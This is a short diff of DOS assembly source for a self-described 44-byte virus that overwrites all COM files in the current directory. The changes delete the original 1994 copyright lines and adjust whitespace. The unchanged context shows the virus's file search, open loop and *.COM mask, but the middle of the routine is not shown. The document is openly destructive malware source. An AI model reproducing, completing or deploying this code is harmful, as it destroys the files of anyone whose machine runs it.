@@ -1,21 +1,17 @@
 ;44 byte virus, overwrites all the COM files in the current directory.
-;
-;(C) 1994 American Eagle Publications,  Inc.
-
 .model  small
 
 .code
 
-
 FNAME   EQU     9EH                     ;search-function file name result
 
         ORG     100H
-
+        
 START:
         mov     ah,4EH                  ;search for *.COM (search first)
         mov     dx,OFFSET COM_FILE
         int     21H
-
+        
 SEARCH_LP:
         jc      DONE
         mov     ax,3D01H                ;open file we found
@@ -40,4 +36,3 @@ DONE:
 COM_FILE        DB      '*.COM',0       ;string for COM file search
 
         END     START
-
